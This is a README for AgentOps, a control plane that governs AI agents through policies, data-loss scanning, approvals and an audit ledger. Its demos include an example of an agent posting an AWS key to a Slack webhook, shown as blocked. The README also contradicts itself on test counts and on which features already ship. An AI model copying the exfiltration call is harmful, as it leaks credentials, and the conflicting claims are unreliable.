# AgentOps — the control plane for autonomous AI agents

> **The firewall and identity layer for the agentic era.** Before an enterprise
> lets AI agents call APIs, move money, or touch a database, AgentOps decides what
> each agent is allowed to do, stops it from leaking sensitive data, keeps a human
> in the loop for high-stakes actions, and records everything in a tamper-evident
> audit ledger.

Python 3.11+ · runs on SQLite out of the box · 326 passing tests · Apache-2.0

---

## The problem

By the end of 2026, Gartner projects 40% of enterprise applications will embed
task-specific AI agents. But an agent that can call APIs, execute trades, or
modify records is **autonomous software running with production credentials** —
and a prompt injection, a hallucinated tool call, or a bad instruction can do
real damage. Today's LLMOps tools watch chat *outputs*; nothing sits in the path
of what agents actually *do*.

**AgentOps is that missing layer.** It is to AI agents what a firewall + Active
Directory is to employees and services: a mandatory control point that every
agent action flows through.

```
   ┌──────────────┐   "can I do X?" / "do X for me"   ┌────────────────────────┐
   │   AI AGENT    │ ────────────────────────────────▶ │   AgentOps Control     │
   │ (LLM + tools) │                                    │        Plane           │
   └──────────────┘ ◀──────────────────────────────── │                        │
        no creds        allow / deny / needs-approval   │  • RBAC policy engine  │
        no direct       (+ DLP-redacted response)       │  • DLP / exfil guard   │
        network                                         │  • human approvals     │
                                                        │  • tamper-evident log  │
                                            injects ┌───┤  • credential vault    │
                                          credential │   └───────────┬────────────┘
                                                     ▼               │ metrics / SIEM
                                            ┌─────────────────┐      ▼
                                            │ Upstream system │   Operator Console
                                            │ (CRM, payments, │   + Prometheus
                                            │  database, API) │   + audit export
                                            └─────────────────┘
```

---

## See it in 90 seconds

Requires **Python 3.11+**. No external services — SQLite out of the box.

```bash
cd agentops
make install     # create a venv and install everything
make seed        # demo roles, policies, agents, connectors
make serve       # console at http://localhost:8080 · API docs at /docs
```

Open **http://localhost:8080** and sign in with `admin@agentops.local` / `admin`.
(Port 8080 busy? run `AGENTOPS_PORT=8090 make serve`.)

Then run the **client pitch demo** — a narrated, real end-to-end scenario you can
show a buyer (it self-provisions its agents and boots a mock upstream for you):

```bash
python examples/pitch_demo.py
```

<details>
<summary>What the pitch demo prints (abridged)</summary>

```
AI SUPPORT AGENT · role: customer-support (read-only)
1. SupportGPT looks up customer #1042 to answer a ticket
   data the agent actually received: {'name': 'Dana Reyes', 'ssn': '[REDACTED:us_ssn]',
                                       'card_number': '[REDACTED:credit_card]', ...}
   plane → ✓ ALLOW   PII redacted before the agent/LLM saw it

2. SupportGPT tries to CHANGE the customer's account tier
   plane → ✗ DENY    least privilege — read-only role cannot mutate

3. A prompt-injected SupportGPT tries to exfiltrate the data directly
   plane → ✗ BLOCKED (401)   the agent holds no upstream credential — the plane does

AI BILLING AGENT · role: billing (refunds, $5k ceiling, $500 review)
4. $250 refund   → ✓ ALLOW              straight-through automation within policy
5. $2,000 refund → ✗ REQUIRE_APPROVAL   dual control — held for a human
6. compliance officer approves → ✓ ALLOW  agent proceeds only after sign-off
7. $9,500 refund → ✗ DENY               hard spending ceiling

AI ANALYTICS AGENT · role: data-analyst (read-only SQL)
8. SELECT ... FROM customers → ✓ ALLOW   SSN + email redacted from every row
9. DELETE FROM customers     → ✗ DENY    read-only — writes refused

AUDIT & COMPLIANCE
   integrity check: chain intact · 24 records · head 3ce2d34d5654f24d…
```
</details>

---

## Who it's for

| Industry | The agent | What AgentOps enforces |
|---|---|---|
| **Financial services** | refund / payments / trading bots | spending ceilings, dual-control approvals, immutable audit for regulators |
| **Healthcare** | intake / records / scheduling agents | PHI never leaves to the model provider; least-privilege access; HIPAA-aligned logs |
| **SaaS & support** | customer-support copilots | read-only tenant scoping, PII redaction, no cross-customer access |
| **DevOps / IT** | remediation & deploy agents | change-window enforcement, approvals on destructive ops, full command trail |
| **Data & analytics** | RAG / reporting agents | read-only governed SQL with PII auto-redacted from results; egress blocking so datasets can't be exfiltrated |

---

## How your agents integrate

**The problem with SDK-only governance:** it only works if the agent *cooperates*.
An agent you don't fully trust can just… not call your API. So the primary mode
requires **no agent code at all**.

**Transparent proxy (recommended — zero integration, no bypass).** Point the
agent's egress at the AgentOps proxy — the *operator* sets `HTTP_PROXY` (and a
network egress rule blocks everything else), not the agent. The agent keeps using
plain `requests`/`httpx`, and every call is policy-checked, DLP-scanned, logged,
and blockable. The agent has no way to opt out:

```bash
agentops proxy --port 8888          # run the forward proxy (shares the plane's DB)
# then, in the agent's environment (set by you, not the agent):
export HTTP_PROXY=http://agent:<api-key>@agentops-host:8888
export HTTPS_PROXY=http://agent:<api-key>@agentops-host:8888
# install the AgentOps CA (printed on proxy start) so HTTPS can be inspected:
export REQUESTS_CA_BUNDLE=/path/to/agentops-ca.crt   # or add it to the OS trust store
```

```python
# the agent's code — completely unmodified, no AgentOps import:
import httpx
httpx.get("https://internal-api/customers/42")            # ALLOWED by policy → forwarded
httpx.post("https://hooks.slack.com/…", json={"x": AWS_KEY})  # BLOCKED — DLP reads the TLS body
```

**HTTPS is fully inspected**, not just tunneled: the proxy terminates TLS with a
certificate signed by the AgentOps CA (which you install in the agent's trust
store), decrypts and governs the request, then re-encrypts to the real origin
(verifying the origin's cert). So DLP and policy apply to actual `https://` bodies.

See [`examples/proxy_demo.py`](examples/proxy_demo.py) — a vanilla `httpx` agent
governed end-to-end (allowed, policy-denied, and DLP-blocked) with no SDK.

**Enforced mode** — when you *can* change the agent and want the plane to hold the
upstream credential (so the agent never has it), call it explicitly:

```python
from agentops_sdk import AgentOpsClient

ops = AgentOpsClient("http://localhost:8080", api_key="agentops_sk_...")

# The plane checks policy + DLP, injects the real credential, calls the upstream,
# scrubs the response of secrets/PII, logs it, and returns the safe result.
customer = ops.call("crm", "GET", "/customers/1042")
# -> {'name': 'Dana Reyes', 'ssn': '[REDACTED:us_ssn]', 'card_number': '[REDACTED:credit_card]', ...}

# Governed read-only SQL — the plane holds the DSN; results come back PII-redacted:
rows = ops.sql("warehouse",
               "SELECT name, ssn, lifetime_value FROM customers WHERE tier = :t",
               params={"t": "vip"})
# -> [{'name': 'Priya Nair', 'ssn': '[REDACTED:us_ssn]', 'lifetime_value': 27600.0}, ...]

# Governed write — runs in a transaction, rolled back if it exceeds the row cap:
res = ops.write("tickets", "UPDATE tickets SET status = :s WHERE id = :id",
                params={"s": "closed", "id": 5001})
# -> {'executed': True, 'rows_affected': 1, ...}
```

**Advisory mode** — for actions the plane can't proxy (e.g. an in-process DB
write). The agent asks first and is trusted to honor the decision:

```python
from agentops_sdk import AgentOpsClient, AuthorizationDenied

with ops.guard("db.write", "db:customers:1042", metadata={"amount": 250}):
    do_the_write()          # runs only if allowed (or approved); raises if denied
```

**Framework integration** — govern an existing tool-calling agent (OpenAI
function calling, Anthropic tool use, or an MCP tool server — they all emit a
`(tool_name, arguments)` pair) with a router that authorizes every call *before*
your handler runs:

```python
from agentops_sdk import GovernedToolRouter

router = GovernedToolRouter(ops)
router.register("issue_refund", issue_refund,
                action_type="payment.refund", resource="payment:refund", amount_arg="amount")

# when the model asks to call a tool, dispatch it through the router:
result = router.dispatch(call.name, call.arguments)   # authorized first; raises if denied
```

LangChain tools wrap in one line with `govern_langchain_tool(ops, tool)`; any
plain function with `govern_tool_fn(ops, fn, action_type=..., resource=...)`.

Runnable demos: [`pitch_demo.py`](examples/pitch_demo.py) (client scenario),
[`enforcing_demo.py`](examples/enforcing_demo.py) (enforced HTTP),
[`toolcalling_demo.py`](examples/toolcalling_demo.py) (governed tool calling),
[`demo_agent.py`](examples/demo_agent.py) (advisory mode).

---

## What each guarantee prevents

| Capability | What it stops | How |
|---|---|---|
| **Transparent proxy** | An untrusted agent bypassing governance entirely (it just doesn't call your API) | Route the agent's egress through the AgentOps forward proxy — every request is policy-checked, DLP-scanned, logged, and blockable with **no agent code and no opt-out** |
| **Enforced execution (HTTP)** | An agent holding upstream credentials | The plane holds the credential and makes the call; the agent never has it |
| **Governed SQL (read)** | Agents holding DB credentials or vacuuming up PII over SQL | The plane holds the DSN and runs the query; only `SELECT`/`WITH`, row-capped, results DLP-redacted |
| **Governed SQL (write)** | Agents running unbounded or destructive writes | Writable connectors only; `INSERT`/`UPDATE`/`DELETE` (never DDL) in a transaction, **rolled back** if the row-affected cap is exceeded, with policy + approval gating |
| **RBAC policy engine** | Over-privileged agents | Roles → glob policies with deny-overrides-allow, priorities, per-action verbs |
| **Data-exfiltration / DLP** | Secrets & PII leaking into prompts, logs, the model provider, or an external endpoint | 15 detectors (cloud keys, private keys, JWTs, PANs w/ Luhn, SSN, PII, high-entropy); redacts requests **and** upstream responses |
| **Custom DLP detectors** | House secret formats the built-ins don't know (internal token prefixes, employee ids) | Operator-defined, org-scoped regex detectors validated at write time and merged with the built-ins on the request path — extend DLP with no code change or fork |
| **Policy change management** | No record of who changed a rule, and no way to undo a bad edit | Every policy create/update/delete is snapshotted; view full history and **roll back** any policy to a prior version (rollback is itself recorded) |
| **Human-in-the-loop** | Unauthorized high-stakes actions (large payouts, destructive ops) | Per-policy approval flags & monetary thresholds; agent proceeds only after sign-off |
| **Adaptive risk scoring** | Actions that are individually in-policy but collectively suspicious | A transparent 0–100 score per decision (DLP severity + egress + amount + resource/action novelty + off-hours + volume z-score); above a threshold it auto-escalates an ALLOW to human approval |
| **Behavioral anomaly detection** | Compromised/hijacked agents drifting from their norm | Per-agent baselines from the agent's own ledger history — novel resource, off-hours activity, denial-ratio and volume surges feed the risk score and alerts |
| **Emergency kill switch** | An incident in progress across the whole fleet | Org-level containment — one toggle denies *every* agent action instantly (recorded in the ledger), superadmin can contain any tenant; **optional time-bound freeze auto-lifts** so it can't be forgotten; resume restores |
| **Per-policy risk step-up** | Wanting human sign-off on *sensitive* actions without turning it on fleet-wide | A policy sets its own `conditions.risk_step_up` threshold — a low value tightens a payments rule, `0` disables step-up for a trusted one — overriding the global threshold per rule |
| **Agent reputation** | Agents that erode trust gradually rather than tripping one rule | A rolling 0–100 trust score per agent (denial ratio, DLP rate, abuse alerts, mean risk), banded trusted→untrusted with explainable signals |
| **Policy intelligence** | Dead, redundant, or dangerously broad policies and coverage gaps | Static + data-driven analysis per role: shadowed allows, duplicates, overly-broad grants, never-matched policies, and top denial hotspots |
| **Policy recommendations** | Recurring legitimate access that keeps getting default-denied | Generates candidate allow rules from recurring default-deny gaps (per-id resources generalized to globs, confidence-scored), one-click adoptable — never suggests undoing an intentional deny/DLP block |
| **Safe-apply impact preview** | Adopting a policy that quietly permits more than intended | Dry-runs any candidate allow against the role's real denied traffic, reporting how many actions it would newly permit, flagging those that carried DLP findings, and warning on overly-broad rules — before anything is written |
| **Signed webhooks** | Spoofed or tampered alert/SIEM deliveries | Every outbound webhook is HMAC-SHA256 signed (`X-AgentOps-Signature`) over the exact body so receivers verify authenticity + integrity |
| **Spend / rate / time limits** | Runaway loops, out-of-window actions, over-limit spend | `max_amount`, `require_approval_over`, `time_window`, `rate_limit`, per-agent quota |
| **Credential vault** | A DB leak exposing upstream credentials | Connector secrets encrypted at rest (Fernet); rotatable without touching the ledger |
| **Tamper-evident audit** | Silent log tampering; disputes over "what did the agent do?" | Keyed-HMAC hash-chained ledger + out-of-band head anchor; `/audit/verify` proves integrity |
| **Observability** | Blind spots | Structured JSON access + decision logs, optional SIEM webhook, Prometheus `/metrics` |

---

## Enterprise & scale (optional adapters)

Every item below ships with a **dependency-free default** and activates only
when its optional extra is installed — so the base stays air-gap-friendly and
single-binary, and you opt into heavy deps per feature:

```bash
pip install agentops[enterprise]   # redis + presidio + kafka + otel
# or à la carte: agentops[redis] / [dlp-ml] / [brokers] / [otel]
```

| Area | Default | Turn it on |
|---|---|---|
| **Rate/quota at scale** | DB `COUNT(*)` | `AGENTOPS_RATE_LIMIT_BACKEND=redis` + `REDIS_URL` — sorted-set sliding window shared across gateway nodes, auto-fallback to DB |
| **Policy-as-code** | built-in engine | `AGENTOPS_POLICY_ENGINE=opa\|cedar` + URL — OPA/Rego or Cedar owns the verdict; AgentOps still enforces DLP/quota/approvals/ledger |
| **ABAC** | always on | policy `conditions.attributes` on `subject.*` / `resource.*` / `env.*` (eq/in/gt/glob/exists); subject+env are server-set |
| **LLM-native guardrails** | always on | prompt-injection / jailbreak / tool-abuse detectors — alerted and egress-blocked |
| **ML DLP** | regex core | `AGENTOPS_DLP_PROVIDERS=presidio` — context-aware PII on top of regex |
| **Message brokers** | — | register a `kafka` connector; agents call `ops.publish(connector, topic, msg)` — governed + DLP-scanned + logged |
| **WebSocket** | — | the proxy governs the WS handshake by policy before the socket opens |
| **Distributed audit anchor** | local file | `AGENTOPS_AUDIT_ANCHOR_BACKENDS=file,transparency_log,rfc3161` — Rekor-style log + RFC-3161 TSA timestamp tokens |
| **Tracing** | off | `AGENTOPS_OTEL_ENABLED=true` — OTel spans across authorize → proxy → upstream with W3C context propagation |
| **SCIM 2.0** | off | `AGENTOPS_SCIM_BEARER_TOKEN=…` — Okta/Azure AD push user create/deactivate to `/api/scim/v2/Users` |

The heavy adapters degrade safely: a missing package or an unreachable
Redis/OPA/TSA logs a warning and falls back (Redis→DB, external policy→fail-closed,
anchors→best-effort) — enabling a feature can never take governance down.

## Architecture

```
agentops/
├── main.py              app factory · fail-closed prod guard · middleware · routers
├── middleware.py        security headers (CSP/HSTS), body-size limit, access logging
├── background.py        async approval-expiry sweeper
├── config.py            all settings via AGENTOPS_* env vars
├── security.py          PBKDF2 passwords · opaque API keys · HS256 JWT (stdlib only)
├── oidc.py              enterprise SSO — OIDC ID-token (RS256) validation
├── tenancy.py           per-org scoping helpers (multi-tenancy)
├── egress.py            SSRF guard for connector HTTP targets
├── vault.py             Fernet encryption of connector credentials (+ rotation)
├── dlp/scanner.py       sensitive-data detectors + single-pass linear redaction
├── policy/engine.py     the Policy Decision Point (pure, unit-tested) + ABAC
├── policy/external.py   policy-as-code seam — OPA (Rego) / Cedar over HTTP
├── policy/analyzer.py   policy intelligence — findings · recommendations · impact preview
├── policy/history.py    policy versioning + rollback (change management)
├── containment.py       org kill switch state + time-bound auto-expiry
├── counters.py          pluggable rate/quota — DB default · Redis sliding window
├── risk.py              adaptive 0–100 risk score + explainable factors + step-up
├── anomaly.py           behavioral baselines over the ledger (novelty, off-hours, z-score)
├── reputation.py        rolling per-agent trust score from ledger + alert history
├── policy/analyzer.py   policy intelligence — shadow/redundant/broad/unused + hotspots
├── webhooks.py          HMAC-signed outbound webhooks (alerts + SIEM)
├── dlp/scanner.py       regex/entropy DLP core + single-pass redaction + custom detectors
├── dlp/llm_guard.py     LLM-native detectors — prompt injection / jailbreak / tool abuse
├── dlp/providers.py     DLP composition — regex core + LLM-guard + optional Presidio (ML)
├── audit/ledger.py      keyed-HMAC hash-chained ledger + cached verify + head anchor
├── audit/anchors.py     anchor backends — file · transparency log · RFC-3161 TSA
├── tracing.py           optional OpenTelemetry spans + W3C context propagation
├── brokers.py           governed message-broker publish (Kafka/RabbitMQ/SQS)
├── gateway_service.py   authorize (advisory) + execute (enforced HTTP) orchestration
├── proxy.py             transparent forward proxy (HTTP + TLS HTTPS + WebSocket handshake)
├── proxy_ca.py          the proxy's CA + per-host leaf certs for HTTPS interception
├── db_connector.py      governed SQL — read (redacted) + write (txn, row-capped)
├── alerts_service.py    detect & respond — risk rules, webhooks, auto-containment
├── routers/             auth, orgs, roles, agents, connectors, gateway, approvals, audit, dashboard, simulator, alerts, scim
└── static/index.html    operator console (zero build step)
sdk/agentops_sdk/        client library (execute · call · query · write · publish · guard · @governed)
    └── integrations.py  GovernedToolRouter (OpenAI/Anthropic/MCP) + LangChain adapter
examples/                pitch_demo · enforcing_demo · demo_agent · mock_upstream
```

**Request flow (enforced):** agent → `/api/v1/gateway/execute` → resolve connector
→ validate path → DLP scan → policy engine → quota/rate → ledger → (approval?) →
inject credential → call upstream → DLP-scan response → ledger → return redacted result.

---

## Security & compliance posture

AgentOps is designed to help you satisfy real controls — it does not claim any
certification, but it produces the enforcement and evidence auditors ask for:

- **Zero-trust by default** — default-deny, deny-overrides-allow, fail-closed
  constraint handling; production boot is refused with default secrets/passwords.
- **Least privilege & separation of duties** — per-agent roles; human approval as
  dual control on high-stakes actions.
- **Enterprise SSO** — operators sign in with your IdP via OpenID Connect (the ID
  token's RS256 signature, issuer, audience and expiry are all validated); users
  are auto-provisioned with a least-privilege default role and an optional
  email-domain allowlist.
- **Multi-tenancy** — every role, agent, connector, policy, approval and audit
  record carries an `org_id`, and **every query is scoped to the caller's org**;
  the gateway resolves connectors only within the agent's org. A dedicated
  isolation test suite proves one tenant cannot see or use another's data.
- **Single-use approvals (race-safe)** — a human approval authorizes exactly one
  execution and is consumed via an atomic compare-and-swap, so an approved
  high-stakes action can't be replayed even under concurrent requests.
- **SSRF guard** — connector HTTP targets that resolve to private / loopback /
  link-local / cloud-metadata addresses are refused (on by default in production),
  so a tenant can't point a connector at internal infrastructure.
- **Defense-in-depth read-only SQL** — read queries run inside a database-enforced
  read-only transaction, so a statement that leads with `SELECT`/`WITH` but hides a
  write (Postgres `SELECT ... INTO`, data-modifying CTEs) is rejected by the DB itself.
- **Data protection** — DLP redaction of PII/secrets in both directions;
  credentials encrypted at rest and never returned by the API.
- **Non-repudiation & audit export** — append-only, keyed hash-chained ledger with
  an out-of-band head anchor; integrity is externally verifiable via
  `/api/audit/head`, and the full trail exports to CSV/JSONL for auditors.
- **Change safety** — `/api/policy/simulate` dry-runs a decision against live or
  proposed policies (nothing executed or logged), so you can test policy changes
  in CI before they reach production.
- **Hardening** — CSP/HSTS/anti-clickjacking headers, request body-size limits,
  login brute-force rate-limiting, timing-safe auth, no native build dependencies.
- **Detect & respond** — every governed decision is scored against risk rules;
  exfiltration attempts and denial spikes raise alerts (with optional Slack /
  PagerDuty / webhook notification), and repeated exfiltration can **auto-suspend**
  the offending agent — containment without waiting for a human.

These map to control families in **SOC 2 / ISO 27001** (access control, change
management, monitoring), **GDPR / HIPAA** (data minimization, audit trail), and
**PCI-DSS** (cardholder-data handling, least privilege). Wire the SIEM webhook and
`/metrics` into your existing stack for continuous monitoring.

---

## Deployment & configuration

**Local / dev:** SQLite, zero config (`make serve`).

**Production (Docker + PostgreSQL):**

```bash
export AGENTOPS_SECRET_KEY=$(openssl rand -hex 32) AGENTOPS_BOOTSTRAP_ADMIN_PASSWORD=change-me
docker compose up --build           # API + console on :8080, Postgres behind it
```

Key settings (all `AGENTOPS_*`, see [`.env.example`](.env.example)):

| Variable | Default | Purpose |
|---|---|---|
| `SECRET_KEY` | dev default | JWT + ledger HMAC key (**required in prod**) |
| `VAULT_KEY` | falls back to `SECRET_KEY` | connector-secret encryption (rotate independently) |
| `DATABASE_URL` | `sqlite:///./agentops.db` | Postgres in prod |
| `DEFAULT_DENY` | `true` | zero-trust: deny actions with no matching allow |
| `DLP_BLOCK_EGRESS_ON_SECRET` | `true` | block outbound actions carrying secrets |
| `APPROVAL_TTL_SECONDS` | `3600` | pending approvals expire (fail-closed) |
| `MAX_REQUEST_BODY_BYTES` | `1048576` | reject oversized bodies (413) |
| `AUDIT_ANCHOR_PATH` | `./…anchor.log` | out-of-band ledger head anchor |
| `SIEM_WEBHOOK_URL` | _(off)_ | POST every decision as JSON to your SIEM |

Operational CLI: `agentops serve | proxy | seed | verify | rotate-vault-key --new-key <k>`.

---

## API surface

| Area | Endpoints |
|---|---|
| Auth (console) | `POST /api/auth/login`, `GET /api/auth/me`, `GET /api/auth/oidc/login`, `.../oidc/callback` (SSO) |
| Organizations | `GET/POST /api/orgs`, `POST /api/orgs/{id}/users` (superadmin), `POST /api/orgs/containment` (kill switch, optional `duration_minutes`), `.../{id}/containment` (superadmin) |
| Roles & policies | `GET/POST/PUT/DELETE /api/roles`, `.../{id}/policies`, `.../policies/{pid}/versions` + `/rollback/{v}` (change history), `.../policies/preview`, `.../{id}/analysis`, `.../{id}/recommendations` (+ `/apply`) |
| DLP detectors | `GET/POST/PUT/DELETE /api/detectors`, `.../test` (custom org-scoped detectors) |
| Agents | `GET/POST/PUT/DELETE /api/agents`, `.../status`, `.../rotate-key`, `.../reputation` |
| Connectors | `GET/POST/PUT/DELETE /api/connectors`, `.../{id}/test` |
| Gateway (agent) | `POST /api/v1/gateway/execute` (enforced HTTP), `.../query` (SQL read), `.../write` (SQL write), `.../publish` (broker), `.../authorize` (advisory), `.../approvals/{id}`, `.../whoami` |
| Approvals (operator) | `GET /api/approvals`, `POST /api/approvals/{id}/resolve` |
| SCIM 2.0 (IdP) | `POST/GET/PUT/PATCH/DELETE /api/scim/v2/Users` (bearer-auth'd; enabled by `SCIM_BEARER_TOKEN`) |
| Audit | `GET /api/audit/records`, `.../records/{seq}`, `.../verify`, `.../head`, `.../export` (CSV/JSONL) |
| Policy | `POST /api/policy/simulate` (dry-run a decision — nothing executed or logged) |
| Alerts | `GET /api/alerts`, `.../count`, `POST /api/alerts/{id}/ack` |
| Dashboard | `GET /api/dashboard/stats`, `.../metrics` (Prometheus) |
| Ops | `GET /health`, `GET /ready` |

Full interactive spec at **`/docs`** (OpenAPI).

---

## Testing & quality

```bash
make ci            # lint + type-check + tests (what CI runs)
make test          # 326 tests
make lint          # ruff
make typecheck     # mypy (clean, 59 modules)
make cover         # coverage report
```

The DLP scanner, policy engine, and ledger are pure and unit-tested; the gateway,
CRUD, and middleware are covered by API-level integration tests, including
adversarial cases (path traversal, oversized payloads, ledger tampering, quota
accounting, timing side-channels, tenant isolation, SSRF, and approval replay).

Engineering hygiene: **296 tests**, `ruff`-clean, **`mypy`-clean** (PEP 561
`py.typed`), a GitHub Actions pipeline ([`.github/workflows/ci.yml`](.github/workflows/ci.yml))
that runs lint + type-check + tests on Python 3.11 and 3.12 and builds the Docker
image, structured JSON-lines logging (`agentops.*` loggers), Alembic migrations,
and a hardened non-root container with a health-check.

---

## Roadmap

- **gRPC & message-queue connectors** — HTTP egress and **SQL read + write** are
  enforced today (writes run in a transaction, row-capped with rollback). A gRPC
  connector and a Kafka/queue connector would extend the same model to RPC and events.
- **Edge rate-limiting** — rolling quota/rate counts are indexed SQL today; a
  multi-instance deployment would offload them to a Redis sliding window.
- **External notarization** — pin `GET /api/audit/head` into a public transparency
  log for third-party-provable non-repudiation.
- **WebSocket / gRPC in the proxy** — the transparent proxy fully inspects HTTP and
  HTTPS (TLS-terminated) today; streaming protocols (WebSocket upgrade, gRPC) would
  extend the same interception model.

---

## License

Apache-2.0.
